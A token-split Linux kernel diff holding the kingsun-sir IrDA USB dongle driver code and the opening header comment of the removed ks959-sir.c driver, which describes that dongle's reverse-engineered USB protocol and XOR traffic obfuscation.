"-", ">", "netdev", ")", ")", "{", "kingsun", "-", ">", "receiving", "=", "0", ";", "return", ";", "}", "/", "*", "unlink", ",", "shutdown", ",", "unplug", ",", "other", "nasties", "*", "/", "if", "(", "urb", "-", ">", "status", "!", "=", "0", ")", "{", "dev_err", "(", "&", "kingsun", "-", ">", "usbdev", "-", ">", "dev", ",", "\"", "kingsun_rcv_irq", ":", "urb", "asynchronously", "failed", "-", "%", "d", "\\", "n", "\"", ",", "urb", "-", ">", "status", ")", ";", "kingsun", "-", ">", "receiving", "=", "0", ";", "return", ";", "}", "if", "(", "urb", "-", ">", "actual_length", "=", "=", "kingsun", "-", ">", "max_rx", ")", "{", "__u8", "*", "bytes", "=", "urb", "-", ">", "transfer_buffer", ";", "int", "i", ";", "/", "*", "The", "very", "first", "byte", "in", "the", "buffer", "indicates", "the", "length", "of", "valid", "data", "in", "the", "read", ".", "This", "byte", "must", "be", "in", "the", "range", "1", ".", ".", "kingsun", "-", ">", "max_rx", "-", "1", ".", "Values", "outside", "this", "range", "indicate", "an", "uninitialized", "Rx", "buffer", "when", "the", "dongle", "has", "just", "been", "plugged", "in", ".", "*", "/", "if", "(", "bytes", "[", "0", "]", ">", "=", "1", "&", "&", "bytes", "[", "0", "]", "<", "kingsun", "-", ">", "max_rx", ")", "{", "for", "(", "i", "=", "1", ";", "i", "<", "=", "bytes", "[", "0", "]", ";", "i", "+", "+)", "{", "async_unwrap_char", "(", "kingsun", "-", ">", "netdev", ",", "&", "kingsun", "-", ">", "netdev", "-", ">", "stats", ",", "&", "kingsun", "-", ">", "rx_buff", ",", "bytes", "[", "i", "]", ");", "}", "kingsun", "-", ">", "receiving", "=", "(", "kingsun", "-", ">", "rx_buff", ".", "state", "!", "=", "OUTSIDE_FRAME", ")", "?", "1", ":", "0", ";", "}", "}", "else", "if", "(", "urb", "-", ">", "actual_length", ">", "0", ")", "{", "dev_err", "(", "&", "kingsun", "-", ">", "usbdev", "-", ">", "dev", ",", "\"", "%", "s", "(", "):", "Unexpected", "response", "length", ",", "expected", "%", "d", "got", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "kingsun", "-", ">", "max_rx", ",", "urb", "-", ">", "actual_length", ")", ";", "}", "/", "*", "This", "urb", "has", "already", "been", "filled", "in", "kingsun_net_open", "*", "/", "ret", "=", "usb_submit_urb", "(", "urb", ",", "GFP_ATOMIC", ")", ";", "}", "/", "*", "*", "Function", "kingsun_net_open", "(", "dev", ")", "*", "*", "Network", "device", "is", "taken", "up", ".", "Usually", "this", "is", "done", "by", "\"", "ifconfig", "irda0", "up", "\"", "*", "/", "static", "int", "kingsun_net_open", "(", "struct", "net_device", "*", "netdev", ")", "{", "struct", "kingsun_cb", "*", "kingsun", "=", "netdev_priv", "(", "netdev", ")", ";", "int", "err", "=", "-", "ENOMEM", ";", "char", "hwname", "[", "16", "]", ";", "/", "*", "At", "this", "point", ",", "urbs", "are", "NULL", ",", "and", "skb", "is", "NULL", "(", "see", "kingsun_probe", ")", "*", "/", "kingsun", "-", ">", "receiving", "=", "0", ";", "/", "*", "Initialize", "for", "SIR", "to", "copy", "data", "directly", "into", "skb", ".", "*", "/", "kingsun", "-", ">", "rx_buff", ".", "in_frame", "=", "FALSE", ";", "kingsun", "-", ">", "rx_buff", ".", "state", "=", "OUTSIDE_FRAME", ";", "kingsun", "-", ">", "rx_buff", ".", "truesize", "=", "IRDA_SKB_MAX_MTU", ";", "kingsun", "-", ">", "rx_buff", ".", "skb", "=", "dev_alloc_skb", "(", "IRDA_SKB_MAX_MTU", ")", ";", "if", "(", "!", "kingsun", "-", ">", "rx_buff", ".", "skb", ")", "goto", "free_mem", ";", "skb_reserve", "(", "kingsun", "-", ">", "rx_buff", ".", "skb", ",", "1", ")", ";", "kingsun", "-", ">", "rx_buff", ".", "head", "=", "kingsun", "-", ">", "rx_buff", ".", "skb", "-", ">", "data", ";", "kingsun", "-", ">", "rx_urb", "=", "usb_alloc_urb", "(", "0", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "kingsun", "-", ">", "rx_urb", ")", "goto", "free_mem", ";", "kingsun", "-", ">", "tx_urb", "=", "usb_alloc_urb", "(", "0", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "kingsun", "-", ">", "tx_urb", ")", "goto", "free_mem", ";", "/", "*", "*", "Now", "that", "everything", "should", "be", "initialized", "properly", ",", "*", "Open", "new", "IrLAP", "layer", "instance", "to", "take", "care", "of", "us", ".", "..", "*", "/", "sprintf", "(", "hwname", ",", "\"", "usb", "#", "%", "d", "\"", ",", "kingsun", "-", ">", "usbdev", "-", ">", "devnum", ")", ";", "kingsun", "-", ">", "irlap", "=", "irlap_open", "(", "netdev", ",", "&", "kingsun", "-", ">", "qos", ",", "hwname", ")", ";", "if", "(", "!", "kingsun", "-", ">", "irlap", ")", "{", "dev_err", "(", "&", "kingsun", "-", ">", "usbdev", "-", ">", "dev", ",", "\"", "irlap_open", "failed", "\\", "n", "\"", ");", "goto", "free_mem", ";", "}", "/", "*", "Start", "first", "reception", "*", "/", "usb_fill_int_urb", "(", "kingsun", "-", ">", "rx_urb", ",", "kingsun", "-", ">", "usbdev", ",", "usb_rcvintpipe", "(", "kingsun", "-", ">", "usbdev", ",", "kingsun", "-", ">", "ep_in", ")", ",", "kingsun", "-", ">", "in_buf", ",", "kingsun", "-", ">", "max_rx", ",", "kingsun_rcv_irq", ",", "kingsun", ",", "1", ")", ";", "kingsun", "-", ">", "rx_urb", "-", ">", "status", "=", "0", ";", "err", "=", "usb_submit_urb", "(", "kingsun", "-", ">", "rx_urb", ",", "GFP_KERNEL", ")", ";", "if", "(", "err", ")", "{", "dev_err", "(", "&", "kingsun", "-", ">", "usbdev", "-", ">", "dev", ",", "\"", "first", "urb", "-", "submit", "failed", ":", "%", "d", "\\", "n", "\"", ",", "err", ")", ";", "goto", "close_irlap", ";", "}", "netif_start_queue", "(", "netdev", ")", ";", "/", "*", "Situation", "at", "this", "point", ":", "-", "all", "work", "buffers", "allocated", "-", "urbs", "allocated", "and", "ready", "to", "fill", "-", "max", "rx", "packet", "known", "(", "in", "max_rx", ")", "-", "unwrap", "state", "machine", "initialized", ",", "in", "state", "outside", "of", "any", "frame", "-", "receive", "request", "in", "progress", "-", "IrLAP", "layer", "started", ",", "about", "to", "hand", "over", "packets", "to", "send", "*", "/", "return", "0", ";", "close_irlap", ":", "irlap_close", "(", "kingsun", "-", ">", "irlap", ")", ";", "free_mem", ":", "if", "(", "kingsun", "-", ">", "tx_urb", ")", "{", "usb_free_urb", "(", "kingsun", "-", ">", "tx_urb", ")", ";", "kingsun", "-", ">", "tx_urb", "=", "NULL", ";", "}", "if", "(", "kingsun", "-", ">", "rx_urb", ")", "{", "usb_free_urb", "(", "kingsun", "-", ">", "rx_urb", ")", ";", "kingsun", "-", ">", "rx_urb", "=", "NULL", ";", "}", "if", "(", "kingsun", "-", ">", "rx_buff", ".", "skb", ")", "{", "kfree_skb", "(", "kingsun", "-", ">", "rx_buff", ".", "skb", ")", ";", "kingsun", "-", ">", "rx_buff", ".", "skb", "=", "NULL", ";", "kingsun", "-", ">", "rx_buff", ".", "head", "=", "NULL", ";", "}", "return", "err", ";", "}", "/", "*", "*", "Function", "kingsun_net_close", "(", "kingsun", ")", "*", "*", "Network", "device", "is", "taken", "down", ".", "Usually", "this", "is", "done", "by", "*", "\"", "ifconfig", "irda0", "down", "\"", "*", "/", "static", "int", "kingsun_net_close", "(", "struct", "net_device", "*", "netdev", ")", "{", "struct", "kingsun_cb", "*", "kingsun", "=", "netdev_priv", "(", "netdev", ")", ";", "/", "*", "Stop", "transmit", "processing", "*", "/", "netif_stop_queue", "(", "netdev", ")", ";", "/", "*", "Mop", "up", "receive", "&", "&", "transmit", "urb", "'", "s", "*", "/", "usb_kill_urb", "(", "kingsun", "-", ">", "tx_urb", ")", ";", "usb_kill_urb", "(", "kingsun", "-", ">", "rx_urb", ")", ";", "usb_free_urb", "(", "kingsun", "-", ">", "tx_urb", ")", ";", "usb_free_urb", "(", "kingsun", "-", ">", "rx_urb", ")", ";", "kingsun", "-", ">", "tx_urb", "=", "NULL", ";", "kingsun", "-", ">", "rx_urb", "=", "NULL", ";", "kfree_skb", "(", "kingsun", "-", ">", "rx_buff", ".", "skb", ")", ";", "kingsun", "-", ">", "rx_buff", ".", "skb", "=", "NULL", ";", "kingsun", "-", ">", "rx_buff", ".", "head", "=", "NULL", ";", "kingsun", "-", ">", "rx_buff", ".", "in_frame", "=", "FALSE", ";", "kingsun", "-", ">", "rx_buff", ".", "state", "=", "OUTSIDE_FRAME", ";", "kingsun", "-", ">", "receiving", "=", "0", ";", "/", "*", "Stop", "and", "remove", "instance", "of", "IrLAP", "*", "/", "if", "(", "kingsun", "-", ">", "irlap", ")", "irlap_close", "(", "kingsun", "-", ">", "irlap", ")", ";", "kingsun", "-", ">", "irlap", "=", "NULL", ";", "return", "0", ";", "}", "/", "*", "*", "IOCTLs", ":", "Extra", "out", "-", "of", "-", "band", "network", "commands", ".", "..", "*", "/", "static", "int", "kingsun_net_ioctl", "(", "struct", "net_device", "*", "netdev", ",", "struct", "ifreq", "*", "rq", ",", "int", "cmd", ")", "{", "struct", "if_irda_req", "*", "irq", "=", "(", "struct", "if_irda_req", "*", ")", "rq", ";", "struct", "kingsun_cb", "*", "kingsun", "=", "netdev_priv", "(", "netdev", ")", ";", "int", "ret", "=", "0", ";", "switch", "(", "cmd", ")", "{", "case", "SIOCSBANDWIDTH", ":", "/", "*", "Set", "bandwidth", "*", "/", "if", "(", "!", "capable", "(", "CAP_NET_ADMIN", ")", ")", "return", "-", "EPERM", ";", "/", "*", "Check", "if", "the", "device", "is", "still", "there", "*", "/", "if", "(", "netif_device_present", "(", "kingsun", "-", ">", "netdev", ")", ")", "/", "*", "No", "observed", "commands", "for", "speed", "change", "*", "/", "ret", "=", "-", "EOPNOTSUPP", ";", "break", ";", "case", "SIOCSMEDIABUSY", ":", "/", "*", "Set", "media", "busy", "*", "/", "if", "(", "!", "capable", "(", "CAP_NET_ADMIN", ")", ")", "return", "-", "EPERM", ";", "/", "*", "Check", "if", "the", "IrDA", "stack", "is", "still", "there", "*", "/", "if", "(", "netif_running", "(", "kingsun", "-", ">", "netdev", ")", ")", "irda_device_set_media_busy", "(", "kingsun", "-", ">", "netdev", ",", "TRUE", ")", ";", "break", ";", "case", "SIOCGRECEIVING", ":", "/", "*", "Only", "approximately", "true", "*", "/", "irq", "-", ">", "ifr_receiving", "=", "kingsun", "-", ">", "receiving", ";", "break", ";", "default", ":", "ret", "=", "-", "EOPNOTSUPP", ";", "}", "return", "ret", ";", "}", "static", "const", "struct", "net_device_ops", "kingsun_ops", "=", "{", ".", "ndo_start_xmit", "=", "kingsun_hard_xmit", ",", ".", "ndo_open", "=", "kingsun_net_open", ",", ".", "ndo_stop", "=", "kingsun_net_close", ",", ".", "ndo_do_ioctl", "=", "kingsun_net_ioctl", ",", "}", ";", "/", "*", "*", "This", "routine", "is", "called", "by", "the", "USB", "subsystem", "for", "each", "new", "device", "*", "in", "the", "system", ".", "We", "need", "to", "check", "if", "the", "device", "is", "ours", ",", "and", "in", "*", "this", "case", "start", "handling", "it", ".", "*", "/", "static", "int", "kingsun_probe", "(", "struct", "usb_interface", "*", "intf", ",", "const", "struct", "usb_device_id", "*", "id", ")", "{", "struct", "usb_host_interface", "*", "interface", ";", "struct", "usb_endpoint_descriptor", "*", "endpoint", ";", "struct", "usb_device", "*", "dev", "=", "interface_to_usbdev", "(", "intf", ")", ";", "struct", "kingsun_cb", "*", "kingsun", "=", "NULL", ";", "struct", "net_device", "*", "net", "=", "NULL", ";", "int", "ret", "=", "-", "ENOMEM", ";", "int", "pipe", ",", "maxp_in", ",", "maxp_out", ";", "__u8", "ep_in", ";", "__u8", "ep_out", ";", "/", "*", "Check", "that", "there", "really", "are", "two", "interrupt", "endpoints", ".", "Check", "based", "on", "the", "one", "in", "drivers", "/", "usb", "/", "input", "/", "usbmouse", ".", "c", "*", "/", "interface", "=", "intf", "-", ">", "cur_altsetting", ";", "if", "(", "interface", "-", ">", "desc", ".", "bNumEndpoints", "!", "=", "2", ")", "{", "dev_err", "(", "&", "intf", "-", ">", "dev", ",", "\"", "kingsun", "-", "sir", ":", "expected", "2", "endpoints", ",", "found", "%", "d", "\\", "n", "\"", ",", "interface", "-", ">", "desc", ".", "bNumEndpoints", ")", ";", "return", "-", "ENODEV", ";", "}", "endpoint", "=", "&", "interface", "-", ">", "endpoint", "[", "KINGSUN_EP_IN", "]", ".", "desc", ";", "if", "(", "!", "usb_endpoint_is_int_in", "(", "endpoint", ")", ")", "{", "dev_err", "(", "&", "intf", "-", ">", "dev", ",", "\"", "kingsun", "-", "sir", ":", "endpoint", "0", "is", "not", "interrupt", "IN", "\\", "n", "\"", ");", "return", "-", "ENODEV", ";", "}", "ep_in", "=", "endpoint", "-", ">", "bEndpointAddress", ";", "pipe", "=", "usb_rcvintpipe", "(", "dev", ",", "ep_in", ")", ";", "maxp_in", "=", "usb_maxpacket", "(", "dev", ",", "pipe", ",", "usb_pipeout", "(", "pipe", ")", ");", "if", "(", "maxp_in", ">", "255", "|", "|", "maxp_in", "<", "=", "1", ")", "{", "dev_err", "(", "&", "intf", "-", ">", "dev", ",", "\"", "endpoint", "0", "has", "max", "packet", "size", "%", "d", "not", "in", "range", "\\", "n", "\"", ",", "maxp_in", ")", ";", "return", "-", "ENODEV", ";", "}", "endpoint", "=", "&", "interface", "-", ">", "endpoint", "[", "KINGSUN_EP_OUT", "]", ".", "desc", ";", "if", "(", "!", "usb_endpoint_is_int_out", "(", "endpoint", ")", ")", "{", "dev_err", "(", "&", "intf", "-", ">", "dev", ",", "\"", "kingsun", "-", "sir", ":", "endpoint", "1", "is", "not", "interrupt", "OUT", "\\", "n", "\"", ");", "return", "-", "ENODEV", ";", "}", "ep_out", "=", "endpoint", "-", ">", "bEndpointAddress", ";", "pipe", "=", "usb_sndintpipe", "(", "dev", ",", "ep_out", ")", ";", "maxp_out", "=", "usb_maxpacket", "(", "dev", ",", "pipe", ",", "usb_pipeout", "(", "pipe", ")", ");", "/", "*", "Allocate", "network", "device", "container", ".", "*", "/", "net", "=", "alloc_irdadev", "(", "sizeof", "(", "*", "kingsun", ")", ");", "if", "(", "!", "net", ")", "goto", "err_out1", ";", "SET_NETDEV_DEV", "(", "net", ",", "&", "intf", "-", ">", "dev", ")", ";", "kingsun", "=", "netdev_priv", "(", "net", ")", ";", "kingsun", "-", ">", "irlap", "=", "NULL", ";", "kingsun", "-", ">", "tx_urb", "=", "NULL", ";", "kingsun", "-", ">", "rx_urb", "=", "NULL", ";", "kingsun", "-", ">", "ep_in", "=", "ep_in", ";", "kingsun", "-", ">", "ep_out", "=", "ep_out", ";", "kingsun", "-", ">", "in_buf", "=", "NULL", ";", "kingsun", "-", ">", "out_buf", "=", "NULL", ";", "kingsun", "-", ">", "max_rx", "=", "(", "__u8", ")", "maxp_in", ";", "kingsun", "-", ">", "max_tx", "=", "(", "__u8", ")", "maxp_out", ";", "kingsun", "-", ">", "netdev", "=", "net", ";", "kingsun", "-", ">", "usbdev", "=", "dev", ";", "kingsun", "-", ">", "rx_buff", ".", "in_frame", "=", "FALSE", ";", "kingsun", "-", ">", "rx_buff", ".", "state", "=", "OUTSIDE_FRAME", ";", "kingsun", "-", ">", "rx_buff", ".", "skb", "=", "NULL", ";", "kingsun", "-", ">", "receiving", "=", "0", ";", "spin_lock_init", "(", "&", "kingsun", "-", ">", "lock", ")", ";", "/", "*", "Allocate", "input", "buffer", "*", "/", "kingsun", "-", ">", "in_buf", "=", "kmalloc", "(", "kingsun", "-", ">", "max_rx", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "kingsun", "-", ">", "in_buf", ")", "goto", "free_mem", ";", "/", "*", "Allocate", "output", "buffer", "*", "/", "kingsun", "-", ">", "out_buf", "=", "kmalloc", "(", "KINGSUN_FIFO_SIZE", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "kingsun", "-", ">", "out_buf", ")", "goto", "free_mem", ";", "printk", "(", "KERN_INFO", "\"", "KingSun", "/", "DonShine", "IRDA", "/", "USB", "found", "at", "address", "%", "d", ",", "\"", "\"", "Vendor", ":", "%", "x", ",", "Product", ":", "%", "x", "\\", "n", "\"", ",", "dev", "-", ">", "devnum", ",", "le16_to_cpu", "(", "dev", "-", ">", "descriptor", ".", "idVendor", ")", ",", "le16_to_cpu", "(", "dev", "-", ">", "descriptor", ".", "idProduct", ")", ");", "/", "*", "Initialize", "QoS", "for", "this", "device", "*", "/", "irda_init_max_qos_capabilies", "(", "&", "kingsun", "-", ">", "qos", ")", ";", "/", "*", "That", "'", "s", "the", "Rx", "capability", ".", "*", "/", "kingsun", "-", ">", "qos", ".", "baud_rate", ".", "bits", "&", "=", "IR_9600", ";", "kingsun", "-", ">", "qos", ".", "min_turn_time", ".", "bits", "&", "=", "KINGSUN_MTT", ";", "irda_qos_bits_to_value", "(", "&", "kingsun", "-", ">", "qos", ")", ";", "/", "*", "Override", "the", "network", "functions", "we", "need", "to", "use", "*", "/", "net", "-", ">", "netdev_ops", "=", "&", "kingsun_ops", ";", "ret", "=", "register_netdev", "(", "net", ")", ";", "if", "(", "ret", "!", "=", "0", ")", "goto", "free_mem", ";", "dev_info", "(", "&", "net", "-", ">", "dev", ",", "\"", "IrDA", ":", "Registered", "KingSun", "/", "DonShine", "device", "%", "s", "\\", "n", "\"", ",", "net", "-", ">", "name", ")", ";", "usb_set_intfdata", "(", "intf", ",", "kingsun", ")", ";", "/", "*", "Situation", "at", "this", "point", ":", "-", "all", "work", "buffers", "allocated", "-", "urbs", "not", "allocated", ",", "set", "to", "NULL", "-", "max", "rx", "packet", "known", "(", "in", "max_rx", ")", "-", "unwrap", "state", "machine", "(", "partially", ")", "initialized", ",", "but", "skb", "=", "=", "NULL", "*", "/", "return", "0", ";", "free_mem", ":", "kfree", "(", "kingsun", "-", ">", "out_buf", ")", ";", "kfree", "(", "kingsun", "-", ">", "in_buf", ")", ";", "free_netdev", "(", "net", ")", ";", "err_out1", ":", "return", "ret", ";", "}", "/", "*", "*", "The", "current", "device", "is", "removed", ",", "the", "USB", "layer", "tell", "us", "to", "shut", "it", "down", ".", "..", "*", "/", "static", "void", "kingsun_disconnect", "(", "struct", "usb_interface", "*", "intf", ")", "{", "struct", "kingsun_cb", "*", "kingsun", "=", "usb_get_intfdata", "(", "intf", ")", ";", "if", "(", "!", "kingsun", ")", "return", ";", "unregister_netdev", "(", "kingsun", "-", ">", "netdev", ")", ";", "/", "*", "Mop", "up", "receive", "&", "&", "transmit", "urb", "'", "s", "*", "/", "if", "(", "kingsun", "-", ">", "tx_urb", "!", "=", "NULL", ")", "{", "usb_kill_urb", "(", "kingsun", "-", ">", "tx_urb", ")", ";", "usb_free_urb", "(", "kingsun", "-", ">", "tx_urb", ")", ";", "kingsun", "-", ">", "tx_urb", "=", "NULL", ";", "}", "if", "(", "kingsun", "-", ">", "rx_urb", "!", "=", "NULL", ")", "{", "usb_kill_urb", "(", "kingsun", "-", ">", "rx_urb", ")", ";", "usb_free_urb", "(", "kingsun", "-", ">", "rx_urb", ")", ";", "kingsun", "-", ">", "rx_urb", "=", "NULL", ";", "}", "kfree", "(", "kingsun", "-", ">", "out_buf", ")", ";", "kfree", "(", "kingsun", "-", ">", "in_buf", ")", ";", "free_netdev", "(", "kingsun", "-", ">", "netdev", ")", ";", "usb_set_intfdata", "(", "intf", ",", "NULL", ")", ";", "}", "#", "ifdef", "CONFIG_PM", "/", "*", "USB", "suspend", ",", "so", "power", "off", "the", "transmitter", "/", "receiver", "*", "/", "static", "int", "kingsun_suspend", "(", "struct", "usb_interface", "*", "intf", ",", "pm_message_t", "message", ")", "{", "struct", "kingsun_cb", "*", "kingsun", "=", "usb_get_intfdata", "(", "intf", ")", ";", "netif_device_detach", "(", "kingsun", "-", ">", "netdev", ")", ";", "if", "(", "kingsun", "-", ">", "tx_urb", "!", "=", "NULL", ")", "usb_kill_urb", "(", "kingsun", "-", ">", "tx_urb", ")", ";", "if", "(", "kingsun", "-", ">", "rx_urb", "!", "=", "NULL", ")", "usb_kill_urb", "(", "kingsun", "-", ">", "rx_urb", ")", ";", "return", "0", ";", "}", "/", "*", "Coming", "out", "of", "suspend", ",", "so", "reset", "hardware", "*", "/", "static", "int", "kingsun_resume", "(", "struct", "usb_interface", "*", "intf", ")", "{", "struct", "kingsun_cb", "*", "kingsun", "=", "usb_get_intfdata", "(", "intf", ")", ";", "if", "(", "kingsun", "-", ">", "rx_urb", "!", "=", "NULL", ")", "usb_submit_urb", "(", "kingsun", "-", ">", "rx_urb", ",", "GFP_KERNEL", ")", ";", "netif_device_attach", "(", "kingsun", "-", ">", "netdev", ")", ";", "return", "0", ";", "}", "#", "endif", "/", "*", "*", "USB", "device", "callbacks", "*", "/", "static", "struct", "usb_driver", "irda_driver", "=", "{", ".", "name", "=", "\"", "kingsun", "-", "sir", "\"", ",", ".", "probe", "=", "kingsun_probe", ",", ".", "disconnect", "=", "kingsun_disconnect", ",", ".", "id_table", "=", "dongles", ",", "#", "ifdef", "CONFIG_PM", ".", "suspend", "=", "kingsun_suspend", ",", ".", "resume", "=", "kingsun_resume", ",", "#", "endif", "}", ";", "module_usb_driver", "(", "irda_driver", ")", ";", "MODULE_AUTHOR", "(", "\"", "Alex", "Villac", "\u00ed", "s", "Lasso", "<", "a_villacis", "@", "palosanto", ".", "com", ">", "\")", ";", "MODULE_DESCRIPTION", "(", "\"", "IrDA", "-", "USB", "Dongle", "Driver", "for", "KingSun", "/", "DonShine", "\"", ");", "MODULE_LICENSE", "(", "\"", "GPL", "\"", ");", "@", "@", "-", "1", ",", "912", "+", "0", ",", "0", "@", "@", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "*", "Filename", ":", "ks959", "-", "sir", ".", "c", "*", "Version", ":", "0", ".", "1", ".", "2", "*", "Description", ":", "Irda", "KingSun", "KS", "-", "959", "USB", "Dongle", "*", "Status", ":", "Experimental", "*", "Author", ":", "Alex", "Villac", "\u00ed", "s", "Lasso", "<", "a_villacis", "@", "palosanto", ".", "com", ">", "*", "with", "help", "from", "Domen", "Puncer", "<", "domen", "@", "coderock", ".", "org", ">", "*", "*", "Based", "on", "stir4200", ",", "mcs7780", ",", "kingsun", "-", "sir", "drivers", ".", "*", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "modify", "*", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "published", "by", "*", "the", "Free", "Software", "Foundation", ";", "either", "version", "2", "of", "the", "License", ".", "*", "*", "This", "program", "is", "distributed", "in", "the", "hope", "that", "it", "will", "be", "useful", ",", "*", "but", "WITHOUT", "ANY", "WARRANTY", ";", "without", "even", "the", "implied", "warranty", "of", "*", "MERCHANTABILITY", "or", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", ".", "See", "the", "*", "GNU", "General", "Public", "License", "for", "more", "details", ".", "*", "*", "You", "should", "have", "received", "a", "copy", "of", "the", "GNU", "General", "Public", "License", "*", "along", "with", "this", "program", ";", "if", "not", ",", "write", "to", "the", "Free", "Software", "*", "Foundation", ",", "Inc", ".", ",", "675", "Mass", "Ave", ",", "Cambridge", ",", "MA", "02139", ",", "USA", ".", "*", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "/", "/", "*", "*", "Following", "is", "my", "most", "current", "(", "2007", "-", "07", "-", "17", ")", "understanding", "of", "how", "the", "Kingsun", "*", "KS", "-", "959", "dongle", "is", "supposed", "to", "work", ".", "This", "information", "was", "deduced", "by", "*", "reverse", "-", "engineering", "and", "examining", "the", "USB", "traffic", "captured", "with", "USBSnoopy", "*", "from", "the", "WinXP", "driver", ".", "Feel", "free", "to", "update", "here", "as", "more", "of", "the", "dongle", "is", "*", "known", ".", "*", "*", "My", "most", "sincere", "thanks", "must", "go", "to", "Domen", "Puncer", "<", "domen", "@", "coderock", ".", "org", ">", "for", "*", "invaluable", "help", "in", "cracking", "the", "obfuscation", "and", "padding", "required", "for", "this", "*", "dongle", ".", "*", "*", "General", ":", "This", "dongle", "exposes", "one", "interface", "with", "one", "interrupt", "IN", "endpoint", ".", "*", "However", ",", "the", "interrupt", "endpoint", "is", "NOT", "used", "at", "all", "for", "this", "dongle", ".", "Instead", ",", "*", "this", "dongle", "uses", "control", "transfers", "for", "everything", ",", "including", "sending", "and", "*", "receiving", "the", "IrDA", "frame", "data", ".", "Apparently", "the", "interrupt", "endpoint", "is", "just", "a", "*", "dummy", "to", "ensure", "the", "dongle", "has", "a", "valid", "interface", "to", "present", "to", "the", "PC", ".", "And", "I", "*", "thought", "the", "DonShine", "dongle", "was", "weird", ".", "..", "In", "addition", ",", "this", "dongle", "uses", "*", "obfuscation", "(", "?!", "?!", "),", "applied", "at", "the", "USB", "level", ",", "to", "hide", "the", "traffic", ",", "both", "sent", "*", "and", "received", ",", "from", "the", "dongle", ".", "I", "call", "it", "obfuscation", "because", "the", "XOR", "keying", "*", "and", "padding", "required", "to", "produce", "an", "USB", "traffic", "acceptable", "for", "the", "dongle", "can", "*", "not", "be", "explained", "by", "any", "other", "technical", "requirement", ".", "*", "*", "Transmission", ":", "To", "transmit", "an", "IrDA", "frame", ",", "the", "driver", "must", "prepare", "a", "control", "*", "URB", "with", "the", "following", "as", "a", "setup", "packet", ":", "*", "bRequestType", "USB_DIR_OUT", "|", "USB_TYPE_CLASS", "|", "USB_RECIP_INTERFACE", "*", "bRequest", "0x09", "*", "wValue", "<", "length", "of", "valid", "data", "before", "padding", ",", "little", "endian", ">", "*", "wIndex", "0x0000", "*", "wLength", "<", "length", "of", "padded", "data", ">", "*", "The", "payload", "packet", "must", "be", "manually", "wrapped", "and", "escaped", "(", "as", "in", "stir4200", ".", "c", ")", ",", "*", "then", "padded", "and", "obfuscated", "before", "being", "sent", ".", "Both", "padding", "and", "obfuscation", "*", "are", "implemented", "in", "the", "procedure", "obfuscate_tx_buffer", "(", ").", "Suffice", "to", "say", ",", "the", "*", "designer", "/", "programmer", "of", "the", "dongle", "used", "his", "name", "as", "a", "source", "for", "the", "*", "obfuscation", ".", "WTF", "?", "!", "*", "Apparently", "the", "dongle", "cannot", "handle", "payloads", "larger", "than", "256", "bytes", ".", "The", "*", "driver", "has", "to", "perform", "fragmentation", "in", "order", "to", "send", "anything", "larger", "than", "*", "this", "limit", ".", "*", "*", "Reception", ":", "To", "receive", "data", ",", "the", "driver", "must", "poll", "the", "dongle", "regularly", "(", "like", "*", "kingsun", "-", "sir", ".", "c", ")", "with", "control", "URBs", "and", "the", "following", "as", "a", "setup", "packet", ":", "*", "bRequestType", "USB_DIR_IN", "|", "USB_TYPE_CLASS", "|", "USB_RECIP_INTERFACE", "*", "bRequest", "0x01", "*", "wValue", "0x0200", "*", "wIndex", "0x0000", "*", "wLength", "0x0800", "(", "size", "of", "available", "buffer", ")", "*", "If", "there", "is", "data", "to", "be", "read", ",", "it", "will", "be", "returned", "as", "the", "response", "payload", ".", "*", "This", "data", "is", "(", "apparently", ")", "not", "padded", ",", "but", "it", "is", "obfuscated", ".", "To", "de", "-", "obfuscate", "*", "it", ",", "the", "driver", "must", "XOR", "every", "byte", ",", "in", "sequence", ",", "with", "a", "value", "that", "starts", "at", "*", "1", "and", "is", "incremented", "with", "each", "byte", "processed", ",", "and", "then", "with", "0x55", ".", "The", "value", "*", "incremented", "with", "each", "byte", "processed", "overflows", "as", "an", "unsigned", "char", ".", "The", "*", "resulting", "bytes", "form", "a", "wrapped", "SIR", "frame", "that", "is", "unwrapped", "and", "unescaped", "*", "as", "in", "stir4200", ".", "c", "The", "incremented", "value", "is", "NOT", "reset", "with", "each", "frame", ",", "but", "is", "*", "kept", "across", "the", "entire", "session", "with", "the", "dongle", ".", "Also", ",", "the", "dongle", "inserts", "an", "*", "extra", "garbage", "byte", "with", "value", "0x95", "(", "after", "decoding", ")", "every", "0xff", "bytes", ",", "which", "*", "must", "be", "skipped", ".", "*", "*", "Speed", "change", ":", "To", "change", "the", "speed", "of", "the", "dongle", ",", "the", "driver", "prepares", "a", "*", "control", "URB", "with", "the", "following", "as", "a", "setup", "packet", ":", "*", "bRequestType", "USB_DIR_OUT", "|", "USB_TYPE_CLASS", "|", "USB_RECIP_INTERFACE", "*", "bRequest", "0x09", "*", "wValue", "0x0200", "*", "wIndex", "0x0001", "*", "wLength", "0x0008", "(", "length", "of", "the", "payload", ")", "*", "The", "payload", "is", "a", "8", "-", "byte", "record", ",", "apparently", "identical", "to", "the", "one", "used", "in", "*", "drivers", "/", "usb", "/", "serial", "/", "cypress_m8", ".", "c", "to", "change", "speed", ":", "*", "__u32", "baudSpeed", ";", "*", "unsigned", "int", "dataBits", ":", "2", ";", "/", "/", "0", "-", "5", "bits", "3", "-", "8", "bits", "*", "unsigned", "int", ":", "1", ";", "*", "unsigned", "int", "stopBits", ":", "1", ";", "*", "unsigned", "int", "parityEnable", ":", "1", ";", "*", "unsigned", "int", "parityType", ":", "1", ";", "*", "unsigned", "int", ":", "1", ";", "*", "unsigned", "int", "reset", ":", "1", ";", "*", "unsigned", "char", "reserved", "[", "3", "]", ";", "/", "/", "set", "to", "0", "*", "*", "For", "now", "only", "SIR", "speeds", "have", "been", "observed", "with", "this", "dongle", ".", "Therefore", ",", "*", "nothing", "is", 